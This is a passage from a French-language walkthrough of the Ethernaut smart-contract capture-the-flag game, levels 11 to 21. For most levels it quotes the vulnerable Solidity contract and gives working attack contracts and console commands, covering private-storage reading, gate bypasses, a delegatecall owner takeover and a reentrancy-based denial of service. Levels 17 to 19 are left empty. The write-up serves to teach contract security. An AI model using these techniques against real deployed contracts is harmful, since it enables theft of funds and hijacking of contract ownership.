Notre objectif est de mettre `top` à la valeur `true`. Pour cela, il faut  que le premier appel à  `building.isLastFloor(_floor)` retourne `false` puis le second appel renvoi `true`.

Pour cela, nous allons simplement créer notre propre contract `Building` et redéfinir la fonction `isLastFloor()` comme expliqué précédemment.

### Attaque

```javascript
contract Building {
    
    Elevator public object;
    bool already = false;
    
    function go(address addr) public payable {
        object = Elevator(addr);
        object.goTo(2);
    }
    
    function isLastFloor(uint floor) public returns (bool) {
        if (already == false) {
            already = true;
            return false;
        } else {
            return true;
        }
    }
}
```

> You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.
>
> An alternative way to solve this level is to build a view function which  returns different results depends on input data but don't modify state,  e.g. `gasleft()`.



---

## 12 - Privacy

---

> **TL;DR**
>
> Lire la blockchain pour trouver la valeur qui permet de débloquer le smart contract.

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

- Understanding how storage works
- Understanding how parameter parsing works
- Understanding how casting works

Tips:

- Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.

```javascript
pragma solidity ^0.5.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

### Analyse

Notre but est d'avoir `locked` à `false`. Pour cela, nous devons connaître la valeur de `data[2]`.

On peut soit utiliser `myth`:

```bash
$ docker run -it --net=host -e INFURA_ID=2f41df8d365740f88e9dd04b27121b10 mythril/myth read-storage --rpc infura-ropsten 0,5 0xA2658BF87985AA3FDBAE8D583BBE833541F989E2
0x0: 0x0000000000000000000000000000000000000000000000000000000000000001 # slot 0
# 01: bool public locked = true;
0x1: 0x000000000000000000000000000000000000000000000000000000005ec6de35 # slot 1
# 5ec6de35: uint256 public ID = block.timestamp; (epoch date)
0x2: 0x00000000000000000000000000000000000000000000000000000000de35ff0a # slot 2
# 0a: uint8 private flattening = 10;
# ff: uint8 private denomination = 255;
# de35: uint16 private awkwardness = uint16(now);
0x3: 0x62bced84fa5500b88774e56f38ca29ee894cc1a6ffd59d366e7aef76e93ada0b # slot 3
# data[0]
0x4: 0x0629adc4d6cd7bf2add11921eeb106385635e233b5377a5552cdd994b6ae9d80 # slot 4
# data[1]
0x5: 0xd8a145f5f299502569822b0c169e864f8e299d3e8ce7f7625d658007419d93f7 # slot 5
# data[2]
0x6: 0x0000000000000000000000000000000000000000000000000000000000000000
0x7: 0x0000000000000000000000000000000000000000000000000000000000000000
0x8: 0x0000000000000000000000000000000000000000000000000000000000000000
0x9: 0x0000000000000000000000000000000000000000000000000000000000000000
```

Soit utiliser `web3`:

```javascript
> await web3.eth.getStorageAt("0xA2658bf87985AA3fdBAE8d583BbE833541F989e2",0)
"0x0000000000000000000000000000000000000000000000000000000000000001"
> await web3.eth.getStorageAt("0xA2658bf87985AA3fdBAE8d583BbE833541F989e2",1)
"0x000000000000000000000000000000000000000000000000000000005ec6de35"
> await web3.eth.getStorageAt("0xA2658bf87985AA3fdBAE8d583BbE833541F989e2",2)
"0x00000000000000000000000000000000000000000000000000000000de35ff0a"
...
```

### Attaque

Nous avons la valeur de `data[2]`, on peut unlock.

```javascript
> await contract.locked()
true

> await contract.unlock("0xd8a145f5f299502569822b0c169e864f8e299d3e8ce7f7625d658007419d93f7");

> await contract.locked()
false
```

> Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's `getStorageAt(...)` can be used to read anything from storage. It can be tricky to read  what you want though, since several optimization rules and techniques  are used to compact the storage as much as possible.
>
> It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": [How to read Ethereum contract storage](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925)



---

## 13 - Gatekeeper One

---

> **TL;DR**
>
> Devenir propriétaire en fournissant une valeur qui respecte plusieurs contraintes.

Make it past the gatekeeper and register as an entrant to pass this level.

##### Things that might help:

- Remember what you've learned from the Telephone and Token levels.
- You can learn more about the `msg.gas` special variable, or its preferred alias `gasleft()`, in Solidity's documentation (see [here](http://solidity.readthedocs.io/en/v0.4.23/units-and-global-variables.html) and [here](http://solidity.readthedocs.io/en/v0.4.23/control-structures.html#external-function-calls)).

```javascript
pragma solidity ^0.5.0;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

### Analyse

Le but de ce niveau est d'exécuter le corps de la fonction `enter()`. Pour cela, il faut respecter les contraintes imposées par les modifieurs `gateOne()`, `gateTwo()` et `gateThree()`.

Pour passer le `gateOne()`, il suffit de réaliser notre attaque depuis un autre smart contrat, facile.

Pour passer le `gateTwo()`, le `gazleft()` courant lors de l'exécution de l'instruction doit être un multiple de `8191`, c'est plutôt facile de le faire en local, un peu plus compliqué pendant la vraie attaque. Nous devons debugger et faire un peu de brute force.

Pour passer le `gateThree()`, nous devons faire respecter quelques conditions à la valeur de `_gateKey`, plutôt facile.

### Attaque

Pour `_gateKey`, nous allons partir de `0x0000111122223333` et lui ajouter les contraintes:

* contrainte 1: `0x0000111100003333`
* contrainte 2: `0x4444111100003333`
* contrainte 3: `0x444411110000XXXX` (`XXXX` doivent être les 16 dernier bits de `tx.origin`)

```javascript
contract Attack {
    GatekeeperOne object;
    bytes8 key = bytes8(0x4444111100000000 | uint16(tx.origin));
    
    constructor(uint256 addr) public {
        object = GatekeeperOne(addr);
    }

    function enterGate() public {
        for (uint256 i = 0; i < 120; i++) {
            (bool ret, bytes memory data) = address(object).call{gas: i + 150 + 8191*3}(abi.encodeWithSignature('enter(bytes8)', key));
            if (ret)
                break;
        }
    }
}
// 3000000 - 4753 - 0x4b - 1
```

> Well done! Next, try your hand with the second gatekeeper...



---

## 14 - Gatekepper Two

---

> **TL;DR**
>
> Même principe que le précédent niveau, nous devons avoir `extcodesize` qui retourne 0 et une condition sur une valeur.

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

##### Things that might help:

- Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
- The `assembly` keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See [here](http://solidity.readthedocs.io/en/v0.4.23/assembly.html) for more information. The `extcodesize` call in this gate will get the size of a contract's code at a given  address - you can learn more about how and when this is set in section 7 of the [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf).
- The `^` character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see [here](http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet)). The Coin Flip level is also a good place to start when approaching this challenge.

```javascript
pragma solidity ^0.5.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

### Analyse

Ce niveau est proche du précédent, nous devons respecter les conditions définies par les 3 modifieurs.

Pour passer `gateTwo()`, il faut que `extcodesize(caller)` retourne 0. Nous devons donc appeler `enter()` depuis le constructeur de notre contrat.

> Google: solidity extcodesize
>
> **Edit: `EXTCODESIZE` returns 0 if it is called from  the constructor of a contract. So if you are using this in a security  sensitive setting, you would have to consider if this is a problem.**

Pour passer `gateThree()`, il faut simplement respecter la condition, appliqué sur `gateKey`. Nous devons appliquer une inversion binaire (bit-wise operation `~`).

### Attaque

```javascript
contract Attack {
    GatekeeperTwo object;
    bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(this)))));
    
    constructor(uint256 addr) public {
        object = GatekeeperTwo(addr);
        (bool ret, bytes memory data) = address(object).call(abi.encodeWithSignature('enter(bytes8)', key));
    }
}
```

> Way to go! Now that you can get past the gatekeeper, you have what it takes to join [theCyber](https://etherscan.io/address/thecyber.eth#code), a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on [reddit](https://www.reddit.com/user/0age) or via [email](mailto:0age@protonmail.com) and use it to register with the contract at [gatekeepertwo.thecyber.eth](https://etherscan.io/address/gatekeepertwo.thecyber.eth#code) (be aware that only the first 128 entrants will be accepted by the contract).



---

## 15 - Naught Coin

---

> **TL;DR**
>
> Réaliser un transfert vers un autre compte en appelant une fonction présente dans le contrat du quel on hérite.

NaughtCoin is an ERC20 token and you're already holding all of them.  The catch is that you'll only be able to transfer them after a 10 year  lockout period. Can you figure out how to get them out to another  address so that you can transfer them freely? Complete this level by  getting your token balance to 0.

 Things that might help

- The [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) Spec
- The [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) codebase

```javascript
pragma solidity ^0.5.0;

import 'openzeppelin-solidity/contracts/token/ERC20/ERC20Detailed.sol';
import 'openzeppelin-solidity/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20, ERC20Detailed {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20Detailed('NaughtCoin', '0x0', 18)
  ERC20()
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) lockTokens public returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
}
```

### Analyse

On peut voir que notre contrat hérite de [ERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol). Nous héritons alors de toutes les fonctions que défini ce dernier. Notre but est de transférer les ethers de notre compte afin de le vider. Nous ne pouvons pas utiliser `transfert`() présent dans `NaughtCoin` car elle est protégée par le modifieur `lockTokens()`.

En cherchant un peu dans le code de ERC20 on tombe sur 2 fonctions intéressantes:

```javascript
    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
```

Nous allons commencer par appeler `increaseAllowance()` puis `transferFrom()` pour faire notre transfert. 

### Attaque

```javascript
> (await contract.balanceOf(player)).toString()
"1000000000000000000000000"

> await contract.increaseAllowance(player, "1000000000000000000000000")

> await contract.transferFrom(player, "0xc5aD6E105f37D4800071e679ec20780d04C93b41", "1000000000000000000000000")

> (await contract.balanceOf(player)).toString()
"0"
```

> When using code that's not your own, it's a good idea to familiarize  yourself with it to get a good understanding of how everything fits  together. This can be particularly important when there are multiple  levels of imports (your imports have imports) or when you are  implementing authorization controls, e.g. when you're allowing or  disallowing people from doing things. In this example, a developer might scan through the code and think that `transfer` is the only  way to move tokens around, low and behold there are other ways of  performing the same operation with a different implementation.



---

## 16 - Preservation

---

> **TL;DR**
>
> Exploiter un `delegatecall` pour modifier le contexte de contrat (slot qui contient `owner`).

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

 Things that might help

- Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
- Understanding what it means for `delegatecall` to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.

```javascript
pragma solidity ^0.5.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

### Analyse

Nous devons devenir `owner` du smart contract. Le problème est que le contrat ne permet pas de faire ce changement à première vue.

On se rabat alors rapidement sur l'utilisation des `delegatecall()` utilisés par `setFirstTime()` et `setSecondTime()`. On peut voir que l'on fait un appel à `setTime(uint256)`.

> There exists a special variant of a message call, named **delegatecall** which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and `msg.sender` and `msg.value` do not change their values.
>
> This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.
>
> This makes it possible to implement the “library” feature in Solidity: Reusable library code that can be applied to a contract’s storage, e.g. in order to  implement a complex data structure.

Nous allons exploiter un appel à `delegateall()` qui nous permet de pouvoir modifier le contexte, donc les valeurs des slots du smart contract. Nous aurons simplement à créer une fonction dans notre smart contract qui possède la bonne signature.

Répartition dans les slots:

* slot 0: `timeZone1Library`
* slot 1: `timeZone2Library`
* slot 2: `owner`

Nous devons modifier la valeur du slot 2.

### Attaque

```javascript
> await contract.timeZone1Library()
"0x4f0c5F3bcc055b0f485F7e165B75B44e2b67f9D6"

> await contract.timeZone2Library()
"0x388ba2Fa282334E76c5563d3AC2EfC33399580B9"

> await contract.owner()
"0xa47AFD98aBba00C731C08F470890dCF6e42d8f27"
```

```javascript
// 0x271016E1fb59FeD5E01F1D42AF81153dD5E942ed
pragma solidity ^0.5.0;

contract Attack {
    address slot0;
    address slot1;
    address slot2;
    
    function setTime(uint _time) public {
        slot2 = msg.sender;
    }
}
```

```javascript
// deploy Attack contract and use its address
> await contract.setFirstTime("0x271016E1fb59FeD5E01F1D42AF81153dD5E942ed")

// recall
> await contract.setFirstTime("0")

// we get owner !
> await contract.owner()
"0x1cee0B9d62488Fe1C57826245C1F1298B6637eC2"
```

> As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract "libraries" that have their own state. This example demonstrates why the `library` keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.



---

## 17 - Recovery

---

> **TL;DR**

A contract creator has built a very simple token factory contract.  Anyone can create new tokens with ease. After deploying the first token  contract, the creator sent `0.5` ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the `0.5` ether from the lost contract address.

```javascript
pragma solidity ^0.5.0;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  function() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

### Analyse



### Attack





---

## 18 - MagicNumber

---

> **TL;DR**

To solve this level, you only need to provide the Ethernaut with a  "Solver", a contract that responds to "whatIsTheMeaningOfLife()" with  the right number.

Easy right? Well... there's a catch.

The solver's code needs to be really  tiny. Really reaaaaaallly tiny. Like freakin' really really itty-bitty  tiny: 10 opcodes at most.

Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That's right: Raw EVM bytecode.

Good luck!

```javascript
pragma solidity ^0.5.0;

contract MagicNum {

  address public solver;

  constructor() public {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}
```

### Analyse



### Attack



---

## 19 - Alien Codex

---

> **TL;DR**

You've uncovered an Alien contract. Claim ownership to complete the level.

 Things that might help

- Understanding how array storage works
- Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
- Using a very `underhanded` approach

```javascript
pragma solidity ^0.5.0;

import 'openzeppelin-solidity/contracts/ownership/Ownable.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

### Analyse



### Attack





---

## 20 - Denial

---

> **TL;DR**
>
> Utilisation d'un `call` pour réaliser un transfert. On réalise une Re-entracy attaque pour appeler plusieurs fois `withdraw()`.

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds) you will win this level.

```javascript
pragma solidity ^0.5.0;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call.value(amountToSend)("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    function() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

### Analyse

Le but de ce niveau est de faire en sorte que lors d'un appel à `withdraw()`, l'instruction `partner.call.value(amountToSend)("");` soit exécutée normalement, et que `owner.transfer(amountToSend);` ne soit pas exécutée, de cette manière `owner` ne recevra pas de part.

On peut voir que le smart contract utilise `call` pour réaliser le transfert sans vérification sur l'adresse du `partner`. On peut alors réaliser une Re-entrancy attack classique.

### Attaque

```javascript
contract Attack {
    Denial public object;
    
    constructor(address payable addr) public payable {
        object = Denial(addr);
    }
    
    function becomePartner() public {
        object.setWithdrawPartner(address(this));
    }
    
    function go() public payable {
        object.withdraw();
    }
    
    function() external payable {
        object.withdraw();
    }
}
```

> This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.
>
> If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `call.gas(100000).value()`.
>
> Typically one should follow the [checks-effects-interactions](http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances  (such as multiple external calls at the end of a function) where issues  such as this can arise.



---

## 21 - Shop

---

> **TL;DR**
>
> Créer une fonction que retourne des valeurs différentes.

Сan you get the item from the shop for less than the price asked?

##### Things that might help:

- `Shop` expects to be used from a `Buyer`
- Understanding how `gas()` options works

```javascript
pragma solidity ^0.5.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3000)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3000)();
    }
  }
}
```

### Analyse

Le but de ce niveau est de modifier la valeur de `price`.

Lors d'un appel à `buy()`, on récupère la valeur de `price` à deux reprises. La premier au seins du `if` avec `_buyer.price.gas(3000)() >= price`, sur cette dernière on s'assure que le `price` est supérieur à `100`.

```javascript
price = _buyer.price.gas(3000)();
```

La second appel à `price()` permet de définir la nouvelle valeur de `price`.

On comprend que le valeur de `price` ne peut que augmenter alors que nous voulons la réduire.

Pour la réduire, nous devons définir une fonction `price()` qui va retourner une valeur > 100 lors de son premier appel, puis une valeur < 100 lors de son second appel.

### Attaque

```javascript
contract Attack is Buyer {
  Shop object;
    
  function go(address addr) public {
      object = Shop(addr);
      object.buy();
  }

  function price() external view returns (uint) {
    return Shop(msg.sender).isSold() ? 0: 101;
  }
}
```

```javascript
// before
> (await contract.price()).toString()
"100"

// after
> (await contract.price()).toString()
"0"
```

> Contracts can manipulate with the data from other contracts the way they want.
>
> It's unsafe to approve some action by double calling even the same view function.

---

Other writeups:

* [https://listed.to/@r1oga](https://listed.to/@r1oga)